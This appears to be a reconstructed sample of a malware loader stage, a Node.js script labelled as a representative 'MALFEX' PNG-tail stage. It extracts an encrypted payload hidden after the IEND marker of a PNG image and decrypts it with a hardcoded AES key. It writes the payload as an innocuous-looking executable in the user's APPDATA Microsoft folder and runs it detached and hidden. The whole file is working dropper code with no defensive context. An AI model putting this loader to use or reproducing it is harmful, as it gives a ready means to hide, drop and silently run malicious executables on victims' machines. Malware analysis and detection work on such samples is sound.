const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

// Representative MALFEX PNG-tail AES stage; not recovered original bytes.
const image = fs.readFileSync(process.argv[2]);
const marker = Buffer.from([0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82]);
const end = image.indexOf(marker);
if (end < 0) throw new Error('invalid carrier');
const trailer = image.slice(end + marker.length);
const iv = trailer.subarray(0, 16);
const key = crypto.createHash('sha256').update('malfexteam2027').digest();
const cipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
const executable = Buffer.concat([cipher.update(trailer.subarray(16)), cipher.final()]);
const destination = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'node_runtime_helper.exe');
fs.mkdirSync(path.dirname(destination), {recursive: true});
fs.writeFileSync(destination, executable);
spawn(destination, [], {detached: true, stdio: 'ignore', windowsHide: true}).unref();
